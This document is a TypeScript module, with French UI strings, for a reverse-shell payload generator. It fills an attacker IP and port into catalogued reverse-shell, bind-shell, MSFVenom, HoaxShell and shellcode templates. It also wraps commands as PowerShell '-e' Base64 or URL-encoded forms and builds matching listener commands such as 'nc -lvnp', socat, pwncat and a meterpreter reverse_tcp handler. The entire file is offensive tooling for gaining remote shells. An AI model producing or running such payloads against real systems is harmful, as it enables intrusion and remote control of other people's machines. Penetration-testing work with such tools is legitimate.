import payloadDataset from './payloads.json'

export const payloadCategories = [
  { id: 'ReverseShell', label: 'Reverse', description: 'Commandes de connexion inversée' },
  { id: 'BindShell', label: 'Bind', description: 'Listeners bind côté cible' },
  { id: 'MSFVenom', label: 'MSFVenom', description: 'Commandes de génération de payloads' },
  { id: 'HoaxShell', label: 'HoaxShell', description: 'Intégration du framework HoaxShell' },
  { id: 'Assembled', label: 'Assembled', description: 'Shellcodes assembleur x86/x64' },
] as const

export type PayloadCategory = (typeof payloadCategories)[number]['id']

/** Compact API kept for the first version of the tool. */
export const payloadTypes = [
  { id: 'bash', label: 'Bash', hint: '/dev/tcp' },
  { id: 'python3', label: 'Python 3', hint: 'socket' },
  { id: 'netcat', label: 'Netcat', hint: 'FIFO' },
] as const

export type PayloadType = (typeof payloadTypes)[number]['id']

export const encodings = [
  { id: 'none', label: 'None' },
  { id: 'url', label: 'URL' },
  { id: 'double-url', label: 'Double URL' },
  { id: 'base64', label: 'Base64' },
] as const

export type PayloadEncoding = (typeof encodings)[number]['id']

export const operatingSystems = [
  { id: 'all', label: 'Tous les OS' },
  { id: 'windows', label: 'Windows' },
  { id: 'linux', label: 'Linux' },
  { id: 'mac', label: 'macOS' },
  { id: 'android', label: 'Android' },
  { id: 'apple_ios', label: 'iOS' },
] as const

export type OperatingSystemFilter = (typeof operatingSystems)[number]['id']

export interface PayloadTemplate {
  name: string
  command: string
  meta: string[]
}

export interface ListenerPreset {
  id: string
  label: string
  command: string
}

interface PayloadDataset {
  reverseShellCommands: PayloadTemplate[]
  listenerCommands: [string, string][]
  shells: string[]
  specialCommands: Record<string, string>
}

const data = payloadDataset as unknown as PayloadDataset

export const payloads = data.reverseShellCommands
export const shells = data.shells
export const listenerPresets: ListenerPreset[] = data.listenerCommands.map(([label, command]) => ({
  id: label.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, ''),
  label,
  command,
}))

export function payloadsForCategory(category: PayloadCategory): PayloadTemplate[] {
  return payloads.filter((payload) => payload.meta.includes(category))
}

export function getPayload(category: PayloadCategory, name: string): PayloadTemplate | undefined {
  return payloads.find((payload) => payload.name === name && payload.meta.includes(category))
}

export function defaultPayloadSelections(): Record<PayloadCategory, string> {
  return Object.fromEntries(payloadCategories.map(({ id }) => [id, payloadsForCategory(id)[0]?.name ?? ''])) as Record<PayloadCategory, string>
}

const ipv4Pattern = /^(?:\d{1,3}\.){3}\d{1,3}$/
const hostnameLabelPattern = /^[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?$/i

/** Accept an IPv4 address or a DNS-style hostname, never shell syntax. */
export function isValidHost(host: string): boolean {
  const value = host.trim()
  if (!value || value.length > 253 || value.includes(':')) return false

  if (ipv4Pattern.test(value)) {
    return value.split('.').every((octet) => {
      const number = Number(octet)
      return number >= 0 && number <= 255
    })
  }

  const hostname = value.endsWith('.') ? value.slice(0, -1) : value
  if (!hostname) return false

  return hostname
    .split('.')
    .every((label) => label.length <= 63 && hostnameLabelPattern.test(label))
}

export function isValidPort(port: string | number): boolean {
  if (typeof port === 'string' && !/^\d{1,5}$/.test(port.trim())) return false
  const value = Number(port)
  return Number.isInteger(value) && value >= 1 && value <= 65535
}

export function isLowPort(port: string | number): boolean {
  return isValidPort(port) && Number(port) < 1024
}

export interface GeneratePayloadOptions {
  host: string
  port: string | number
  shell: string
  category: PayloadCategory
  encoding?: PayloadEncoding
}

const hoaxShellTypes: Record<string, string> = {
  'Windows CMD cURL': 'cmd-curl',
  'PowerShell IEX': 'ps-iex',
  'PowerShell IEX Constr Lang Mode': 'ps-iex-cm',
  'PowerShell Outfile': 'ps-outfile',
  'PowerShell Outfile Constr Lang Mode': 'ps-outfile-cm',
  'Windows CMD cURL https': 'cmd-curl -c /your/cert.pem -k /your/key.pem',
  'PowerShell IEX https': 'ps-iex -c /your/cert.pem -k /your/key.pem',
  'PowerShell Constr Lang Mode IEX https': 'ps-iex-cm -c /your/cert.pem -k /your/key.pem',
  'PowerShell Outfile https': 'ps-outfile -c /your/cert.pem -k /your/key.pem',
  'PowerShell Outfile Constr Lang Mode https': 'ps-outfile-cm -c /your/cert.pem -k /your/key.pem',
}

function toShellcodeBytes(host: string, port: number): { ip: string; port: string } {
  if (!ipv4Pattern.test(host) || !isValidHost(host)) {
    throw new Error('Les payloads Assembled nécessitent une adresse IPv4, pas un nom d’hôte.')
  }

  const ip = host.split('.').map((octet) => `\\x${Number(octet).toString(16).padStart(2, '0')}`).join('')
  const hexPort = port.toString(16).padStart(4, '0')
  const portBytes = hexPort.match(/.{2}/g)?.map((byte) => `\\x${byte}`).join('') ?? ''
  return { ip, port: portBytes }
}

function encodeBase64(value: string): string {
  const bytes = new TextEncoder().encode(value)
  let binary = ''
  for (let index = 0; index < bytes.length; index += 0x8000) {
    binary += String.fromCharCode(...bytes.subarray(index, index + 0x8000))
  }
  return btoa(binary)
}

function encodePowerShellBase64(value: string): string {
  const bytes = new Uint8Array(value.length * 2)
  for (let index = 0; index < value.length; index += 1) {
    const codeUnit = value.charCodeAt(index)
    bytes[index * 2] = codeUnit & 0xff
    bytes[index * 2 + 1] = codeUnit >> 8
  }
  let binary = ''
  for (let index = 0; index < bytes.length; index += 0x8000) {
    binary += String.fromCharCode(...bytes.subarray(index, index + 0x8000))
  }
  return btoa(binary)
}

function fixedEncodeURIComponent(value: string): string {
  return encodeURIComponent(value).replace(/[!'()*]/g, (character) => `%${character.charCodeAt(0).toString(16).toUpperCase()}`)
}

function encodeCommand(command: string, encoding: PayloadEncoding): string {
  switch (encoding) {
    case 'url':
      return fixedEncodeURIComponent(command)
    case 'double-url':
      return fixedEncodeURIComponent(fixedEncodeURIComponent(command))
    case 'base64':
      return encodeBase64(command)
    default:
      return command
  }
}

function getMetasploitPayload(command: string): string {
  return command.match(/\s+-p\s+([a-zA-Z0-9/_]+)/)?.[1] ?? 'windows/x64/meterpreter/reverse_tcp'
}

function replaceParameters(command: string, options: GeneratePayloadOptions, payloadName: string): string {
  const host = options.host.trim().toLowerCase()
  const portNumber = Number(options.port)
  let ipValue = host
  let portValue = String(portNumber)

  if (options.category === 'Assembled') {
    const bytes = toShellcodeBytes(host, portNumber)
    ipValue = bytes.ip
    portValue = bytes.port
  }

  const commandType = hoaxShellTypes[payloadName] ?? 'cmd-curl'
  const msfPayload = options.category === 'MSFVenom'
    ? getMetasploitPayload(command)
    : 'windows/x64/meterpreter/reverse_tcp'

  return command.replace(/\{(ip|port|shell|payload|type)\}/g, (_match, parameter: string) => {
    switch (parameter) {
      case 'ip': return ipValue
      case 'port': return portValue
      case 'shell': return options.shell
      case 'payload': return msfPayload
      case 'type': return commandType
      default: return _match
    }
  })
}

/** Render a catalogued command with validated connection details and optional encoding. */
export function generatePayload(template: PayloadTemplate, options: GeneratePayloadOptions): string {
  const host = options.host.trim().toLowerCase()
  const encoding = options.encoding ?? 'none'

  if (!isValidHost(host)) throw new Error('Adresse IPv4 ou nom d’hôte invalide.')
  if (!isValidPort(options.port)) throw new Error('Le port doit être compris entre 1 et 65535.')
  if (!shells.includes(options.shell)) throw new Error('Sélectionne un shell cible valide.')
  if (!template.meta.includes(options.category)) throw new Error('Ce payload ne correspond pas à l’onglet sélectionné.')

  let command: string
  if (template.name === 'PowerShell #3 (Base64)') {
    const source = replaceParameters(data.specialCommands['PowerShell payload'], options, template.name)
    command = `powershell -e ${encodePowerShellBase64(source)}`
  } else if (template.name === 'PowerShell #5 (stderr support) (Base64)') {
    const source = replaceParameters(data.specialCommands['PowerShell +stderr payload'], options, template.name)
    command = `powershell -e ${encodePowerShellBase64(source)}`
  } else {
    command = replaceParameters(template.command, options, template.name)
  }

  return encodeCommand(command, encoding)
}

export interface ListenerGenerationOptions {
  host: string
  port: string | number
  category: PayloadCategory
  selectedPayload: PayloadTemplate
}

export interface ListenerOutput {
  command: string
  warning: string
}

function adaptUdpListener(preset: ListenerPreset): { command: string; warning: string } {
  const command = preset.command
  switch (preset.id) {
    case 'nc':
      return { command: command.replace(/^nc\s+/, 'nc -u '), warning: '' }
    case 'nc-freebsd':
      return { command: command.replace('nc -lvn', 'nc -lun'), warning: '' }
    case 'busybox-nc':
      return { command: command.replace(/^busybox nc\s+/, 'busybox nc -u '), warning: '' }
    case 'ncat':
    case 'ncat-exe':
      return { command: command.replace(/^(ncat(?:\.exe)?)\s+/, '$1 -u '), warning: '' }
    case 'rlwrap-nc':
      return { command: command.replace('rlwrap -cAr nc ', 'rlwrap -cAr nc -u '), warning: '' }
    case 'rustcat':
      return { command: command.replace('rcat listen ', 'rcat listen -u '), warning: '' }
    case 'socat':
    case 'socat-tty':
      return { command: command.replaceAll('TCP-LISTEN:', 'UDP-LISTEN:').replaceAll('TCP:', 'UDP:'), warning: '' }
    case 'pwncat':
    case 'pwncat-windows':
      return { command: command.replace(/^(python3 -m pwncat(?: -m windows)?)\s+/, '$1 -u '), warning: '' }
    case 'ncat-tls':
      return { command, warning: 'ncat --ssl ne prend pas en charge UDP.' }
    case 'openssl':
      return { command: 'openssl s_server -dtls -accept {port} -cert server-cert.pem -key server-key.pem', warning: 'Le listener OpenSSL utilise DTLS ; vérifie la compatibilité du payload UDP.' }
    case 'msfconsole':
      return { command, warning: 'Les listeners msfconsole de ce générateur ne prennent pas en charge UDP.' }
    case 'windows-conpty':
      return { command, warning: 'Le mode Windows ConPty ne prend pas en charge UDP nativement.' }
    case 'powercat':
      return { command, warning: 'Powercat ne propose pas de listener UDP dans ce preset.' }
    case 'hoaxshell':
      return { command, warning: 'HoaxShell fonctionne sur HTTP/HTTPS, pas sur UDP.' }
    default:
      return { command, warning: 'Vérifie manuellement la prise en charge d’UDP par ce listener.' }
  }
}

/** Generate the selected listener command, including UDP and privileged-port hints. */
export function generateListenerForPreset(
  preset: ListenerPreset,
  options: ListenerGenerationOptions,
): ListenerOutput {
  if (!isValidPort(options.port)) throw new Error('Le port doit être compris entre 1 et 65535.')
  if (!isValidHost(options.host)) throw new Error('Adresse IPv4 ou nom d’hôte invalide.')

  const isUdpPayload = ['Bash udp', 'ncat udp'].includes(options.selectedPayload.name)
  const adapted = isUdpPayload ? adaptUdpListener(preset) : { command: preset.command, warning: '' }
  const shellType = hoaxShellTypes[options.selectedPayload.name] ?? 'cmd-curl'
  const msfPayload = options.category === 'MSFVenom'
    ? getMetasploitPayload(options.selectedPayload.command)
    : 'windows/x64/meterpreter/reverse_tcp'
  let command = adapted.command
    .replaceAll('{port}', String(Number(options.port)))
    .replaceAll('{ip}', options.host.trim().toLowerCase())
    .replaceAll('{payload}', msfPayload)
    .replaceAll('{type}', shellType)

  if (isLowPort(options.port) && !/^(?:ncat\.exe|stty\s|powercat\b|cmd\b|powershell\b)/i.test(command)) {
    command = `sudo ${command}`
  }

  return { command, warning: adapted.warning }
}

/** Backwards-compatible default Netcat listener helper. */
export function generateListener(port: string | number): string {
  if (!isValidPort(port)) throw new Error('Le port doit être compris entre 1 et 65535.')
  return `nc -lvnp ${Number(port)}`
}

/** Backwards-compatible helpers from the first iteration of the tool. */
export function generateReverseShell(
  host: string,
  port: string | number,
  type: PayloadType,
): string {
  const legacyTemplates: Record<PayloadType, { name: string; shell: string }> = {
    bash: { name: 'Bash -i', shell: 'bash' },
    python3: { name: 'Python3 #1', shell: shells[0] },
    netcat: { name: 'nc mkfifo', shell: shells[0] },
  }
  const selection = legacyTemplates[type]
  const template = getPayload('ReverseShell', selection.name)
  if (!template) throw new Error(`Aucun payload disponible pour ${type}.`)
  return generatePayload(template, { host, port, shell: selection.shell, category: 'ReverseShell' })
}
